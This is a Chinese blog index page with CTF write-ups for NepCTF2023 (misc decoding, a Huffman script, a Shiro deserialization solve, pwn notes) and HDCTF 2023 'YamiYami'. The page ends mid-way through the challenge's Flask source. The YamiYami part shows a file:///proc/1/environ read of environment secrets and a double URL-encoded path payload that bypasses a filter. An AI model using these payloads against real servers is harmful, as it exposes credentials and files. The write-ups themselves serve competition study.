<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.8.0" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.8.0" type="image/png" sizes="32x32"><meta name="description" content="万幸得以相识">
<meta property="og:type" content="website">
<meta property="og:title" content="晴川&#39;s Blog">
<meta property="og:url" content="https://qingchuana.github.io/page/3/index.html">
<meta property="og:site_name" content="晴川&#39;s Blog">
<meta property="og:description" content="万幸得以相识">
<meta property="og:locale" content="zh_CN">
<meta property="article:author" content="Qingchuan">
<meta property="article:tag" content="ctf 小菜鸡 热爱">
<meta name="twitter:card" content="summary"><title>晴川's Blog</title><link ref="canonical" href="https://qingchuana.github.io/page/3/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.8.0"><link rel="stylesheet" href="css/custom.css"><script>var Stun = window.Stun || {};
var CONFIG = {
  root: '/',
  algolia: undefined,
  assistSearch: undefined,
  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
  postWidget: {"endText":true},
  nightMode: {"enable":true},
  back2top: {"enable":true},
  codeblock: {"style":"default","highlight":"light","wordWrap":false},
  reward: false,
  fancybox: false,
  zoomImage: {"gapAside":"20px"},
  galleryWaterfall: undefined,
  lazyload: false,
  pjax: undefined,
  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
  shortcuts: undefined,
  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
  sourcePath: {"js":"js","css":"css","images":"images"},
};

window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.3.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">Hello Stun</div><div class="header-banner-info__subtitle">An elegant theme for Hexo</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/">NepCTF2023--部分Wp</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-12</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="NepCTF2023–部分wp">
          <a href="#NepCTF2023–部分wp" class="heading-link"><i class="fas fa-link"></i></a><a href="#NepCTF2023–部分wp" class="headerlink" title="NepCTF2023–部分wp"></a>NepCTF2023–部分wp</h1>
      
        <h1 id="Misc">
          <a href="#Misc" class="heading-link"><i class="fas fa-link"></i></a><a href="#Misc" class="headerlink" title="Misc:"></a>Misc:</h1>
      
        <h2 id="Check-in">
          <a href="#Check-in" class="heading-link"><i class="fas fa-link"></i></a><a href="#Check-in" class="headerlink" title="Check in"></a>Check in</h2>
      <p>NepCTF{H4ve_Fun_1N_This_Game}</p>

        <h2 id="与AI共舞的哈夫曼">
          <a href="#与AI共舞的哈夫曼" class="heading-link"><i class="fas fa-link"></i></a><a href="#与AI共舞的哈夫曼" class="headerlink" title="与AI共舞的哈夫曼"></a>与AI共舞的哈夫曼</h2>
      <p>需要在原本附件里自带的py文件修改一下即可</p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> heapq</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">HuffmanNode</span>:</span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, char, freq</span>):</span><br><span class="line">    self.char = char</span><br><span class="line">    self.freq = freq</span><br><span class="line">    self.left = <span class="literal">None</span></span><br><span class="line">    self.right = <span class="literal">None</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">def</span> <span class="title function_">__lt__</span>(<span class="params">self, other</span>):</span><br><span class="line">    <span class="keyword">return</span> self.freq &lt; other.freq</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree</span>(<span class="params">frequencies</span>):</span><br><span class="line">  heap = [HuffmanNode(char, freq) <span class="keyword">for</span> char, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">  heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">    left = heapq.heappop(heap)</span><br><span class="line">    right = heapq.heappop(heap)</span><br><span class="line">    merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">    merged.left = left</span><br><span class="line">    merged.right = right</span><br><span class="line">    heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_codes</span>(<span class="params">node, current_code, huffman_codes</span>):</span><br><span class="line">  <span class="keyword">if</span> node <span class="keyword">is</span> <span class="literal">None</span>:</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> node.char <span class="keyword">is</span> <span class="keyword">not</span> <span class="literal">None</span>:</span><br><span class="line">    huffman_codes[node.char] = current_code</span><br><span class="line">    <span class="keyword">return</span></span><br><span class="line"></span><br><span class="line">  build_huffman_codes(node.left, current_code + <span class="string">&#x27;0&#x27;</span>, huffman_codes)</span><br><span class="line">  build_huffman_codes(node.right, current_code + <span class="string">&#x27;1&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">compress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    data = f.read()</span><br><span class="line"></span><br><span class="line">  frequencies = &#123;&#125;</span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">    <span class="keyword">if</span> byte <span class="keyword">not</span> <span class="keyword">in</span> frequencies:</span><br><span class="line">      frequencies[byte] = <span class="number">0</span></span><br><span class="line">    frequencies[byte] += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">  root = build_huffman_tree(frequencies)</span><br><span class="line">  huffman_codes = &#123;&#125;</span><br><span class="line">  build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line"></span><br><span class="line">  compressed_data = <span class="string">&#x27;&#x27;</span></span><br><span class="line">  <span class="keyword">for</span> byte <span class="keyword">in</span> data:</span><br><span class="line">    compressed_data += huffman_codes[byte]</span><br><span class="line"></span><br><span class="line">  padding = <span class="number">8</span> - <span class="built_in">len</span>(compressed_data) % <span class="number">8</span></span><br><span class="line">  compressed_data += <span class="string">&#x27;0&#x27;</span> * padding</span><br><span class="line"></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    \<span class="comment"># Write frequency information</span></span><br><span class="line">    f.write(<span class="built_in">bytes</span>([<span class="built_in">len</span>(frequencies)]))</span><br><span class="line">    <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items():</span><br><span class="line">      f.write(<span class="built_in">bytes</span>([byte, (freq &gt;&gt; <span class="number">24</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">16</span>) &amp; <span class="number">0xFF</span>, (freq &gt;&gt; <span class="number">8</span>) &amp; <span class="number">0xFF</span>, freq &amp; <span class="number">0xFF</span>]))</span><br><span class="line"></span><br><span class="line">​    \<span class="comment"># Write compressed data</span></span><br><span class="line">​    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="built_in">len</span>(compressed_data), <span class="number">8</span>):</span><br><span class="line">​      byte = compressed_data[i:i+<span class="number">8</span>]</span><br><span class="line">​      f.write(<span class="built_in">bytes</span>([<span class="built_in">int</span>(byte, <span class="number">2</span>)]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">build_huffman_tree_from_bytes</span>(<span class="params">frequencies</span>):</span><br><span class="line">  heap = [HuffmanNode(byte, freq) <span class="keyword">for</span> byte, freq <span class="keyword">in</span> frequencies.items()]</span><br><span class="line">  heapq.heapify(heap)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">while</span> <span class="built_in">len</span>(heap) &gt; <span class="number">1</span>:</span><br><span class="line">    left = heapq.heappop(heap)</span><br><span class="line">    right = heapq.heappop(heap)</span><br><span class="line">    merged = HuffmanNode(<span class="literal">None</span>, left.freq + right.freq)</span><br><span class="line">    merged.left = left</span><br><span class="line">    merged.right = right</span><br><span class="line">    heapq.heappush(heap, merged)</span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> heap[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decompress</span>(<span class="params">input_file, output_file</span>):</span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(input_file, <span class="string">&#x27;rb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    frequencies_count = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">    frequencies = &#123;&#125;</span><br><span class="line"></span><br><span class="line">​    <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(frequencies_count):</span><br><span class="line">​      byte = <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">​      freq = (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">24</span>) + (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">16</span>) + (<span class="built_in">ord</span>(f.read(<span class="number">1</span>)) &lt;&lt; <span class="number">8</span>) + <span class="built_in">ord</span>(f.read(<span class="number">1</span>))</span><br><span class="line">​      frequencies[byte] = freq</span><br><span class="line"></span><br><span class="line">​    root = build_huffman_tree_from_bytes(frequencies)</span><br><span class="line"></span><br><span class="line">​    huffman_codes = &#123;&#125;</span><br><span class="line">​    build_huffman_codes(root, <span class="string">&#x27;&#x27;</span>, huffman_codes)</span><br><span class="line">​    reverse_huffman_codes = &#123;v: k <span class="keyword">for</span> k, v <span class="keyword">in</span> huffman_codes.items()&#125;</span><br><span class="line"></span><br><span class="line">​    decompressed_data = <span class="built_in">bytearray</span>()</span><br><span class="line">​    code = <span class="string">&#x27;&#x27;</span></span><br><span class="line">​    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">​      byte = f.read(<span class="number">1</span>)</span><br><span class="line">​      <span class="keyword">if</span> <span class="built_in">len</span>(byte) == <span class="number">0</span>:</span><br><span class="line">​        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">​      byte = <span class="built_in">ord</span>(byte)</span><br><span class="line">​      <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>, -<span class="number">1</span>, -<span class="number">1</span>):</span><br><span class="line">​        <span class="keyword">if</span> byte &amp; (<span class="number">1</span> &lt;&lt; i):</span><br><span class="line">​          code += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">​        <span class="keyword">else</span>:</span><br><span class="line">​          code += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"></span><br><span class="line">​        <span class="keyword">if</span> code <span class="keyword">in</span> reverse_huffman_codes:</span><br><span class="line">​          decompressed_data.append(reverse_huffman_codes[code])</span><br><span class="line">​          code = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">with</span> <span class="built_in">open</span>(output_file, <span class="string">&#x27;wb&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(decompressed_data)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">  \<span class="comment"># input_file = &#x27;input.txt&#x27;</span></span><br><span class="line">  compressed_file = <span class="string">&#x27;compressed.bin&#x27;</span></span><br><span class="line">  decompressed_file = <span class="string">&#x27;decompressed.txt&#x27;</span></span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 压缩文件</span></span><br><span class="line">  \<span class="comment"># compress(input_file, compressed_file)</span></span><br><span class="line"></span><br><span class="line">  \<span class="comment"># 解压缩文件</span></span><br><span class="line">  decompress(compressed_file, decompressed_file)</span><br><span class="line"></span><br></pre></td></tr></table></div></figure>


        <h2 id="小叮弹钢琴">
          <a href="#小叮弹钢琴" class="heading-link"><i class="fas fa-link"></i></a><a href="#小叮弹钢琴" class="headerlink" title="小叮弹钢琴"></a>小叮弹钢琴</h2>
      <p>下载拿到piano.bin，是个音频文件，拉进Audacity看一下，发现有频谱，通过放大缩小频谱发现有字符串，将字符串抄写下来，钱一部分是摩斯密码，后部分是16进制</p>
<blockquote>
<p>1011 111 001 000 0000 111 001 0100 100 001 000 0 1 0000 00 000 1 111 1001 111 010 000 111 11 0 1 0000 00 10 110</p>
</blockquote>
<p><strong>0x370a05303c290e045005031c2b1858473a5f052117032c39230f005d1e17</strong></p>
<p>对摩斯面解码发现：</p>
<p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\image-20230812145240478.png"></p>
<p>YOUSHOULDUSETHISTOXORSOMETHING</p>
<p>提示应该有异或，但暂时不知道是什么，</p>
<p>后来试了半天与16进制转字符串异或</p>
<p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\image-20230814161353554.png"></p>

        <h2 id="codes">
          <a href="#codes" class="heading-link"><i class="fas fa-link"></i></a><a href="#codes" class="headerlink" title="codes"></a>codes</h2>
      <figure class="highlight c"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">extern</span> <span class="type">char</span> **en\</span><br><span class="line">viron;</span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="type">int</span> i = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">while</span> (en\</span><br><span class="line">viron[i] != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%s\n&quot;</span>, en\</span><br><span class="line">viron[i]);</span><br><span class="line">        i++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></div></figure>




        <h2 id="陌生的语言">
          <a href="#陌生的语言" class="heading-link"><i class="fas fa-link"></i></a><a href="#陌生的语言" class="headerlink" title="陌生的语言"></a>陌生的语言</h2>
      <p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\QQ图片20230813163223.jpg"></p>
<p>打开图片一脸懵，发现有特殊符号，题目描述说</p>
<p>A同学在回学校的路上捡到了一张纸条，你能帮帮她吗？</p>
<p>flag格式：NepCTF{XX_XX}</p>
<p>hint：A同学的英文名为“Atsuko Kagari”</p>
<p>去搜Atsuko Kagari”，发现为小魔女学园动漫女主角，去看了动漫，发现里面有着文字，新月文字和古龙语，去上网找解释</p>
<p>找到</p>
<p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\blog2\themes\butterfly\source\img\QQ图片20230813163230.jpg"></p>
<p>对应写出，按照感觉添加下划线</p>
<blockquote>
<p>NepCTF{NEPNEP_A_BELIEVING_HEART_IS_YOUR_MAGIC}</p>
</blockquote>

        <h2 id="ConnectedFive">
          <a href="#ConnectedFive" class="heading-link"><i class="fas fa-link"></i></a><a href="#ConnectedFive" class="headerlink" title="ConnectedFive"></a>ConnectedFive</h2>
      <p>这道题就是个游戏，就是自己和机器人下棋，你自己先先连出来42和5子棋就可得到flag，不想在复现一遍了。。。</p>

        <h1 id="web">
          <a href="#web" class="heading-link"><i class="fas fa-link"></i></a><a href="#web" class="headerlink" title="web"></a>web</h1>
      
        <h2 id="ez-java-checkin">
          <a href="#ez-java-checkin" class="heading-link"><i class="fas fa-link"></i></a><a href="#ez-java-checkin" class="headerlink" title="ez_java_checkin"></a>ez_java_checkin</h2>
      <p>题目说是一种很老的cve，题目又是java-checkin，上网搜，找到一个跟java有关得cve</p>
<p>shiro550反序列化漏洞</p>
<p>利用工具</p>
<p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\1\hexoblog\source\image\image-20230813164252615.png" alt="image-20230813164252615"></p>
<p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\1\hexoblog\source\image\image-20230813164322711.png" alt="image-20230813164322711"></p>
<p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\1\hexoblog\source\image\image-20230813164337799.png" alt="image-20230813164337799"></p>
<p>得到flag</p>
<blockquote>
<p>NepcTF{Ezjava_Chekin}</p>
</blockquote>

        <h1 id="pwn">
          <a href="#pwn" class="heading-link"><i class="fas fa-link"></i></a><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h1>
      
        <h2 id="HRP-CHAT">
          <a href="#HRP-CHAT" class="heading-link"><i class="fas fa-link"></i></a><a href="#HRP-CHAT" class="headerlink" title="HRP-CHAT"></a>HRP-CHAT</h2>
      
        <h3 id="HRP-CHAT-4">
          <a href="#HRP-CHAT-4" class="heading-link"><i class="fas fa-link"></i></a><a href="#HRP-CHAT-4" class="headerlink" title="HRP-CHAT-4"></a>HRP-CHAT-4</h3>
      <p>当时打boss给系统打崩了就进入到了安全模式但是很懵，本来看代码相出3的，就去看了一下safebox.c,发现这里面可以吐出来4flag</p>
<p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\1\hexoblog\source\image\image-20230814152239315.png" alt="image-20230814152239315"></p>
<p>输入Safe_Mode_Key即可得出flag</p>

        <h3 id="HRP-CHAT-3">
          <a href="#HRP-CHAT-3" class="heading-link"><i class="fas fa-link"></i></a><a href="#HRP-CHAT-3" class="headerlink" title="HRP-CHAT-3"></a>HRP-CHAT-3</h3>
      <p>看servc.c源码发现</p>
<p><img src="/2023/08/24/NepCTF2023--%E9%83%A8%E5%88%86wp/AAwangzhan\1\hexoblog\source\image\image-20230814153345494.png" alt="image-20230814153345494"></p>
<p>打败bossT能够得到flag</p>

        <h1 id="问卷调查">
          <a href="#问卷调查" class="heading-link"><i class="fas fa-link"></i></a><a href="#问卷调查" class="headerlink" title="问卷调查"></a>问卷调查</h1>
      <p>NepCTF{See_you_in_NepCTF2024} </p>
</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2023/08/24/%5BHDCTF%202023%5DYamiYami/">HDCTF 2023-YamiYami</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2023-08-24</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2023-11-04</span></span></div></header><div class="post-body"><div class="post-excerpt">
        <h1 id="HDCTF-2023-YamiYami">
          <a href="#HDCTF-2023-YamiYami" class="heading-link"><i class="fas fa-link"></i></a><a href="#HDCTF-2023-YamiYami" class="headerlink" title="HDCTF 2023 YamiYami"></a>HDCTF 2023 YamiYami</h1>
      <p>非预期解：进入题目界面第一个点开&#x2F;read路由跳转到百度，发现有文件读取，直接file:&#x2F;&#x2F;&#x2F;proc&#x2F;1&#x2F;environ读取环境变量得flag</p>
<p>预期解：</p>
<p>在&#x2F;read路由尝试读app.py和flag发现被正则过滤,url二次编码app&#x2F;app.py:</p>
<p>这里有url二次编码可绕过过滤</p>
<figure class="highlight plaintext"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file:///%25%36%31%25%37%30%25%37%30%25%32%46%25%36%31%25%37%30%25%37%30%25%32%45%25%37%30%25%37%39</span><br></pre></td></tr></table></div></figure>

<p><img src="http://raw.githubusercontent.com/qingchuana/img/main/img/image-20230923155634248.png"></p>
<figure class="highlight python"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#encoding:utf-8</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> re, random, uuid</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> werkzeug.utils <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> yaml</span><br><span class="line"><span class="keyword">from</span> urllib.request <span class="keyword">import</span> urlopen</span><br><span class="line">app = Flask(__name__)</span><br><span class="line">random.seed(uuid.getnode())</span><br><span class="line">app.config[<span class="string">&#x27;SECRET_KEY&#x27;</span>] = <span class="built_in">str</span>(random.random()*<span class="number">233</span>)</span><br><span class="line">app.debug = <span class="literal">False</span></span><br><span class="line">BLACK_LIST=[<span class="string">&quot;yaml&quot;</span>,<span class="string">&quot;YAML&quot;</span>,<span class="string">&quot;YML&quot;</span>,<span class="string">&quot;yml&quot;</span>,<span class="string">&quot;yamiyami&quot;</span>]</span><br><span class="line">app.config[<span class="string">&#x27;UPLOAD_FOLDER&#x27;</span>]=<span class="string">&quot;/app/uploads&quot;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    session[<span class="string">&#x27;passport&#x27;</span>] = <span class="string">&#x27;YamiYami&#x27;</span></span><br><span class="line">    <span class="keyword">return</span> <span class="string">&#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="string">    Welcome to HDCTF2023 &lt;a href=&quot;[/read?url=https://baidu.com](view-source:http://node2.anna.nssctf.cn:28427/read?url=https://baidu.com)&quot;&gt;Read somethings&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Here is the challenge &lt;a href=&quot;[/upload](view-source:http://node2.anna.nssctf.cn:28427/upload)&quot;&gt;Upload file&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &lt;br&gt;</span></span><br><span class="line"><span class="string">    Enjoy it &lt;a href=&quot;[/pwd](view-source:http://node2.anna.nssctf.cn:28427/pwd)&quot;&gt;pwd&lt;/a&gt;</span></span><br><span class="line"><span class="string">    &#x27;&#x27;&#x27;</span></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span 